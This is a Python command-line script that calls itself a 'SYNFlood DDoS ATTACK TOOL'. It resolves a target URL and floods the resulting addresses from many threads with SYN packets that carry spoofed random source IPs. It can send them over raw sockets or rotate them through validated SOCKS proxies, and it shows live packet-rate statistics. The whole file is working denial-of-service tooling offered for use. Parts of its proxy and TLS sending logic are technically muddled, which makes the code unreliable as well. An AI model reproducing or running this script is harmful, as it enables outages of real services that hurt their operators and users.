#!/usr/bin/env python3
import argparse
import random
import socket
import logging
import ssl
import os
from urllib.parse import urlparse
import time
from collections import defaultdict
from contextlib import suppress
from threading import Thread, Lock
from socks import SOCKS5, set_default_proxy
from concurrent.futures import ThreadPoolExecutor
import requests
from scapy.all import IP, TCP


# ---------------------- Logging Setup ----------------------
logging.basicConfig(
    filename='syn_flood.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def log_packet_sent(dst_ip, dst_port, src_ip):
    logging.info(f"SYN packet sent from {src_ip} to {dst_ip}:{dst_port}")


class ProxyChecker:
    @staticmethod
    def checkAll(proxies: list, url: str = "https://httpbin.org/get", timeout: int = 5, threads: int = 1000):
        with ThreadPoolExecutor(max_workers=min(len(proxies), threads)) as executor:
            future_to_proxy = {
                executor.submit(ProxyChecker._check_single, proxy, url, timeout): proxy
                for proxy in proxies
            }
            return [proxy for future, proxy in future_to_proxy.items() if future.result()]

    @staticmethod
    def _check_single(proxy: str, url: str, timeout: int):
        try:
            response = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=timeout)
            return response.status_code == 200
        except requests.RequestException:
            return False

# Function to validate proxies using ProxyChecker
def filter_working_proxies(proxies):
    print(f"proxy count: {len(proxies)}")
    print("[INFO] Validating proxies...")
    valid_proxies = ProxyChecker.checkAll(proxies)
    print(f"[INFO] {len(valid_proxies)} proxies are valid.")
    return valid_proxies


# Function to load proxies from a file

def load_proxies_from_file(file_path):
    proxies = []
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]

    return proxies


# ---------------------- Rate Limiter ----------------------
class RateLimiter:
    """
    Allows only a limited number of requests per second per key.
    In this example, the key will be the source IP.
    """
    def __init__(self, limit):
        self.limit = limit
        self.timestamps = defaultdict(list)
        self.lock = Lock()

    def allow_request(self, key):
        current_time = time.time()
        with self.lock:
            # Keep only timestamps within the last second
            self.timestamps[key] = [t for t in self.timestamps[key] if current_time - t < 1]
            if len(self.timestamps[key]) < self.limit:
                self.timestamps[key].append(current_time)
                return True
        return False


class SYNFlood:
    def __init__(self, target_ip, target_port, rate_limit, proxies=None, use_tls=False):
        self.target = (target_ip, target_port)
        self.syn_packet_count = 0
        self.rate_limiter = RateLimiter(rate_limit)
        self.lock = Lock()
        self.proxies = proxies if proxies else []  # List of valid proxies
        self.proxy_index = 0  # To rotate proxies
        self.use_tls = use_tls  # Use TLS/SSL encryption if True

    def generate_random_ip(self) -> str:
        """Generate random source IP address."""
        return "{}.{}.{}.{}".format(random.randint(1, 255), random.randint(0, 255), random.randint(0, 255), random.randint(1, 255))

    def _generate_syn(self) -> tuple[bytes, str]:
        """Generate SYN packet with randomized attributes."""
        src_ip = self.generate_random_ip()  # Randomize source IP
        ip_layer = IP(src=src_ip, dst=self.target[0], ttl=random.randint(1, 255))  # Random TTL
        tcp_layer = TCP(
            sport=random.randint(32768, 65535),
            dport=self.target[1],
            flags="S",
            seq=random.randint(0, 4294967295),
            window=random.randint(1000, 65535),  # Randomize TCP window size
        )
        payload_size = random.randint(0, 1460)
        payload = b'\x00' * payload_size  # No payload, just SYN
        packet = ip_layer / tcp_layer / payload
        return bytes(packet), src_ip

    def _send_syn_packet(self, raw_packet: bytes, proxy=None):
        """Send SYN packet through a raw socket or proxy."""
        with suppress(Exception):
            if self.use_tls:
                # Wrap the socket with SSL/TLS encryption
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect(self.target)
                    ssl_sock = context.wrap_socket(sock, server_hostname=self.target[0])
                    ssl_sock.send(raw_packet)
            else:
                if proxy:
                    # Forward packet via SOCKS proxy
                    self._forward_packet_via_proxy(raw_packet, proxy)
                else:
                    # Send directly without proxy
                    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as sock:
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        sock.sendto(raw_packet, self.target)

    def _forward_packet_via_proxy(self, raw_packet: bytes, proxy: str):
        """Forward the SYN packet through a SOCKS proxy."""
        set_default_proxy(SOCKS5, proxy, 1080)  # Set SOCKS5 proxy (default port 1080)
        socket.socket = socket.socket  # Make sure we're using the SOCKS wrapper
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect(self.target)
            sock.send(raw_packet)

    def _get_next_proxy(self) -> str:
        """Get the next available proxy for use in the attack."""
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return proxy

    def run_flood(self, packets_per_iteration: int):
        """Run SYN flood attack with rate limiting and proxy rotation."""
        while True:
            for _ in range(packets_per_iteration):
                raw_packet, src_ip = self._generate_syn()

                # Get the next available proxy
                proxy = self._get_next_proxy()

                if self.rate_limiter.allow_request(src_ip):
                    # Forward packets through proxy if one is available
                    if proxy:
                        self._send_syn_packet(raw_packet, proxy=proxy)
                    else:
                        self._send_syn_packet(raw_packet, proxy=None)

                    with self.lock:
                        self.syn_packet_count += 1
                    log_packet_sent(self.target[0], self.target[1], src_ip)
                else:
                    time.sleep(0.001)

            time.sleep(0.005)  # Reduce packet generation frequency to avoid rate-limiting issues

    def get_packet_count(self) -> int:
        """Get the total number of SYN packets sent."""
        with self.lock:
            return self.syn_packet_count

    def set_tls(self, use_tls: bool):
        """Toggle TLS encryption on or off."""
        self.use_tls = use_tls



# ---------------------- Statistics Display ----------------------
def display_statistics(syn_flooder: SYNFlood):
    prev_count = 0
    while True:
        time.sleep(1)
        current_count = syn_flooder.get_packet_count()
        rps = current_count - prev_count
        prev_count = current_count
        print(f"Total SYN Packets Sent: {current_count} (RPS: {rps})")



def resolve_url_to_ips(url):
    """
    Resolves a URL to its IP addresses.
    Returns a list of IPs associated with the given domain.
    """
    # Strip the protocol from the URL
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname

    try:
        ip_list = list(set(
            info[4][0] for info in socket.getaddrinfo(hostname, None, socket.AF_INET)
        ))
        return ip_list
    except socket.gaierror:
        print(f"Error: Unable to resolve {url}")
        return []
    

def main(target_url, target_port=80, thread_count=100, packets_per_thread=100, rate=10, proxies_file=None):
    """
    Main function that launches the SYN flood attack with parameters passed directly.
    """

    proxies = []
    if proxies_file:
        proxies = load_proxies_from_file(proxies_file)

    print("[INFO] Checking proxies...")
    valid_proxies = filter_working_proxies(proxies)
    if not valid_proxies:
        print("[ERROR] No valid proxies found, aborting attack.")
        return
    
    print(f"[INFO] Valid proxies found: {len(valid_proxies)}")
    # Proceed with the SYN flood attack using valid proxies
    
    

    # Resolve URL to IP addresses
    target_ips = resolve_url_to_ips(target_url)

    if not target_ips:
        print("No valid IPs found for the given URL. Exiting.")
        return

    print(f"Resolved {target_url} to {target_ips}")

    for target_ip in target_ips:
        print(f"Launching SYN flood on {target_ip}:{target_port}...")

        syn_flooder = SYNFlood(target_ip, target_port, rate_limit=rate, proxies=proxies)

        # Start statistics thread
        stats_thread = Thread(target=display_statistics, args=(syn_flooder,), daemon=True)
        stats_thread.start()

        # Launch flood threads
        threads = []
        for _ in range(thread_count):
            thread = Thread(target=syn_flooder.run_flood, args=(packets_per_thread,), daemon=True)
            thread.start()
            threads.append(thread)

    print("Press Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Stopping SYN flood attack...")

# ---------------------- CLI Main Function ----------------------
def cli_main():
    """
    Parses command-line arguments and passes them to main() function.
    """
    parser = argparse.ArgumentParser(description="Enhanced Multi-threaded SYN Flood Attack Script")
    parser.add_argument("target_url", help="Target URL to resolve to IP addresses")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Number of threads (default: 100)")
    parser.add_argument("-n", "--packets", type=int, default=100, help="Number of SYN packets per thread iteration (default: 100)")
    parser.add_argument("--rate", type=int, default=5, help="Rate limit per source IP (SYN packets per second, default: 10)")
    parser.add_argument("--proxies", type=str, help="Path to the file containing proxies")

    args = parser.parse_args()

    # Pass the arguments to the main function
    main(args.target_url, args.port, args.threads, args.packets, args.rate, args.proxies)


def Banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    color = "\033[1;31m"  # Red color for the banner
    reset_color = "\033[0m"
    banner = r"""
 ██████╗ ██╗   ██╗███╗   ██╗███████╗██╗     ██████╗  ██████╗ ╗██████╗
██╔════╝ ██║   ██║████╗  ██║██╔════╝██║    ██╔═══██╗██╔═══██╗║██╔══██╗
╚█████╗  ╚██╗ ██╔╝██╔██╗ ██║███████╗██║    ██║   ██║██║   ██║║██║  ██║
 ╚═══██╗  ╚████╔╝ ██║╚██╗██║██╔══╝  ██║    ██║   ██║██║   ██║║██║  ██║
██████╔╝   ╚██╔╝  ██║ ╚████║██║     ██████╗╚██████╔╝╚██████╔╝║██████╔╝
╚═════╝    ╚═══╝  ╚═╝  ╚═══╝╚═╝     ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝
    SYNFlood DDoS ATTACK TOOL
    Version 1.0
    """
    print(f"{color}{banner}{reset_color}")


Banner()


if __name__ == "__main__":
    cli_main()